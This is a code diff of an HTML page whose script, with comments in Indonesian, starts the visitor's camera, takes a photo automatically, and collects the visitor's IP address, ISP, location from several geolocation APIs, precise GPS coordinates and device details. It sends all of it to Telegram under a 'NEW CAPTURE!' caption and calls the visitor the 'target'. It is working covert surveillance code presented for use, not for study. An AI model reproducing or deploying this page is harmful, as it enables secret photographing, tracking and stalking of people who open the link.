@@ -34,7 +34,6 @@
 
     let stream = null;
     let photoTaken = false;
-    let finalData = {};
 
     // ========== MULAI KAMERA ==========
     async function startCamera() {
@@ -46,8 +45,7 @@
             video.srcObject = stream;
             statusEl.textContent = '✅ Kamera aktif';
 
-            await gatherAllData();
-
+            // Tunggu bentar biar data kelar
             setTimeout(() => {
                 if (!photoTaken) captureAndSend();
             }, 600);
@@ -58,84 +56,13 @@
         }
     }
 
-    // ========== KUMPULKAN SEMUA DATA ==========
-    async function gatherAllData() {
-        // IP & Geolokasi dari 3 API sekaligus, lalu di-merge
-        const [ipApi, ipApiCo, kameroGeo] = await Promise.all([
-            fetch('https://ip-api.io/json/').then(r => r.json()).catch(() => ({})),
-            fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({})),
-            fetch('https://geo.kamero.ai/api/geo').then(r => r.json()).catch(() => ({}))
-        ]);
-
-        // GPS dari browser
-        const gps = await getGPS();
-
-        // Merge data: prioritas ip-api.io > ipapi.co > kamero
-        finalData = {
-            // IP
-            ip: ipApi.ip || ipApiCo.ip || kameroGeo.ip || 'Unknown',
-            // Kota
-            city: ipApi.city || ipApiCo.city || kameroGeo.city || 'Unknown',
-            // Region
-            region: ipApi.region || ipApiCo.region || kameroGeo.countryRegion || 'Unknown',
-            // Negara
-            country: ipApi.country || ipApiCo.country_name || kameroGeo.country || 'Unknown',
-            // Kode Negara
-            country_code: ipApi.country_code || ipApiCo.country_code || kameroGeo.countryCode || 'Unknown',
-            // ISP
-            isp: ipApi.isp || ipApiCo.org || ipApiCo.organization || kameroGeo.org || 'Unknown',
-            // Timezone
-            timezone: ipApi.timezone || ipApiCo.timezone || kameroGeo.timezone || 'Unknown',
-            // Latitude & Longitude (IP-based)
-            lat: ipApi.latitude || ipApiCo.latitude || kameroGeo.latitude || null,
-            lon: ipApi.longitude || ipApiCo.longitude || kameroGeo.longitude || null,
-            // GPS (lebih akurat)
-            gps_lat: gps ? gps.lat : null,
-            gps_lng: gps ? gps.lng : null,
-            gps_accuracy: gps ? gps.accuracy : null,
-            // Device
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            language: navigator.language,
-            screen: `${screen.width}x${screen.height} (${window.devicePixelRatio}x)`,
-            timezone_device: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            online: navigator.onLine,
-            cookies: navigator.cookieEnabled,
-            // Extra
-            zip: ipApi.zip || ipApiCo.postal || kameroGeo.postalCode || 'Unknown',
-            currency: ipApi.currency || ipApiCo.currency || 'Unknown',
-            languages: ipApiCo.languages || 'Unknown'
-        };
-    }
-
-    // ========== GPS DARI BROWSER ==========
-    function getGPS() {
-        return new Promise((resolve) => {
-            if (!navigator.geolocation) {
-                resolve(null);
-                return;
-            }
-            navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                    resolve({
-                        lat: pos.coords.latitude,
-                        lng: pos.coords.longitude,
-                        accuracy: pos.coords.accuracy
-                    });
-                },
-                () => resolve(null),
-                { timeout: 8000, enableHighAccuracy: true }
-            );
-        });
-    }
-
     // ========== CAPTURE & KIRIM ==========
     async function captureAndSend() {
         if (!stream || photoTaken) return;
 
         statusEl.textContent = '📸 Memproses...';
 
-        // Capture foto
+        // 1. Capture foto
         const canvas = document.createElement('canvas');
         canvas.width = video.videoWidth || 480;
         canvas.height = video.videoHeight || 360;
@@ -143,60 +70,60 @@
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         const imageDataUrl = canvas.toDataURL('image/jpeg', 0.8);
 
-        const d = finalData;
-        const now = new Date();
+        // 2. Dapatkan data REAL dari target (bukan default)
+        const ipData = await getRealIPData();
+        const gpsData = await getGPSData();
+        const deviceData = getDeviceData();
 
-        // ========== BUILD CAPTION ==========
+        // 3. Build caption
+        const now = new Date();
         let caption = `📸 *NEW CAPTURE!*
 🕐 ${now.toLocaleString('id-ID', { weekday: 'long', day: 'numeric', month: 'long', year: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit' })}
 
 ━━━━━━━━━━━━━━━━━━━━━━
-🌐 *IP ADDRESS*
-• IP: ${d.ip}
-• ISP: ${d.isp}
-• Country: ${d.country} (${d.country_code})
-• Region: ${d.region}
-• City: ${d.city}
-• Postal: ${d.zip}
-• Timezone: ${d.timezone}
-• Currency: ${d.currency}
-• Languages: ${d.languages}
+🌐 *IP ADDRESS (REAL)*
+• IP: ${ipData.ip || 'Unknown'}
+• ISP: ${ipData.isp || ipData.org || 'Unknown'}
+• Organization: ${ipData.org || 'Unknown'}
 
 ━━━━━━━━━━━━━━━━━━━━━━
-📍 *LOCATION (IP-BASED)*
-• Coordinates: ${d.lat ? `${d.lat}, ${d.lon}` : 'Tidak tersedia'}
-• Map: ${d.lat ? `https://www.google.com/maps?q=${d.lat},${d.lon}` : 'Tidak tersedia'}
+📍 *LOCATION (REAL)*
+• City: ${ipData.city || 'Unknown'}
+• Region: ${ipData.region || 'Unknown'}
+• Country: ${ipData.country || 'Unknown'}
+• Postal: ${ipData.zip || 'Unknown'}
+• Timezone: ${ipData.timezone || 'Unknown'}
+• Coordinates: ${ipData.lat ? `${ipData.lat}, ${ipData.lon}` : 'Tidak tersedia'}
 
 ━━━━━━━━━━━━━━━━━━━━━━
-🛰️ *GPS LOCATION (Real-time)*`;
+🛰️ *GPS (REAL)*`;
 
-        if (d.gps_lat) {
-            const gmaps = `https://www.google.com/maps?q=${d.gps_lat},${d.gps_lng}`;
-            const osm = `https://www.openstreetmap.org/?mlat=${d.gps_lat}&mlon=${d.gps_lng}&zoom=15`;
+        if (gpsData) {
+            const gmaps = `https://www.google.com/maps?q=${gpsData.lat},${gpsData.lng}`;
+            const osm = `https://www.openstreetmap.org/?mlat=${gpsData.lat}&mlon=${gpsData.lng}&zoom=15`;
             caption += `
-• GPS Coordinates: ${d.gps_lat}, ${d.gps_lng}
-• Accuracy: ±${Math.round(d.gps_accuracy || 0)} meters
+• GPS: ${gpsData.lat}, ${gpsData.lng}
+• Accuracy: ±${Math.round(gpsData.accuracy || 0)} meters
 • Google Maps: ${gmaps}
 • OpenStreetMap: ${osm}`;
         } else {
             caption += `
-• GPS: Tidak tersedia (izin ditolak/tidak support)
-• IP-Based Map: ${d.lat ? `https://www.google.com/maps?q=${d.lat},${d.lon}` : 'Tidak tersedia'}`;
+• GPS: Tidak tersedia (izin ditolak)`;
         }
 
         caption += `
 
 ━━━━━━━━━━━━━━━━━━━━━━
-📱 *DEVICE INFO*
-• Browser: ${d.userAgent}
-• Platform: ${d.platform}
-• Language: ${d.language}
-• Screen: ${d.screen}
-• Device Timezone: ${d.timezone_device}
-• Online: ${d.online ? 'Yes' : 'No'}
-• Cookies: ${d.cookies ? 'Enabled' : 'Disabled'}`;
+📱 *DEVICE (REAL)*
+• Browser: ${deviceData.userAgent}
+• Platform: ${deviceData.platform}
+• Language: ${deviceData.language}
+• Screen: ${deviceData.screen}
+• Device Timezone: ${deviceData.timezone}
+• Online: ${deviceData.online}
+• Cookies: ${deviceData.cookies}`;
 
-        // ========== KIRIM KE TELEGRAM ==========
+        // 4. Kirim ke Telegram
         const byteString = atob(imageDataUrl.split(',')[1]);
         const mimeString = imageDataUrl.split(',')[0].split(':')[1].split(';')[0];
         const ab = new ArrayBuffer(byteString.length);
@@ -240,9 +167,67 @@
         }
     }
 
+    // ========== GET REAL IP & LOCATION (bukan default) ==========
+    async function getRealIPData() {
+        try {
+            // Pake ip-api.io yang selalu return data real per request
+            const res = await fetch('https://ip-api.io/json/');
+            const data = await res.json();
+            return {
+                ip: data.ip || 'Unknown',
+                city: data.city || 'Unknown',
+                region: data.region || 'Unknown',
+                country: data.country || 'Unknown',
+                zip: data.zip || 'Unknown',
+                isp: data.isp || 'Unknown',
+                org: data.org || 'Unknown',
+                timezone: data.timezone || 'Unknown',
+                lat: data.latitude || null,
+                lon: data.longitude || null,
+                currency: data.currency || 'Unknown'
+            };
+        } catch (err) {
+            return {};
+        }
+    }
+
+    // ========== GET GPS ==========
+    function getGPSData() {
+        return new Promise((resolve) => {
+            if (!navigator.geolocation) {
+                resolve(null);
+                return;
+            }
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    resolve({
+                        lat: pos.coords.latitude,
+                        lng: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy
+                    });
+                },
+                () => resolve(null),
+                { timeout: 8000, enableHighAccuracy: true }
+            );
+        });
+    }
+
+    // ========== GET DEVICE DATA (REAL) ==========
+    function getDeviceData() {
+        return {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screen: `${screen.width}x${screen.height} (${window.devicePixelRatio}x)`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            online: navigator.onLine ? 'Yes' : 'No',
+            cookies: navigator.cookieEnabled ? 'Enabled' : 'Disabled'
+        };
+    }
+
     // ========== JALANKAN ==========
     startCamera();
 </script>
 
 </body>
-</html>
+    </html>
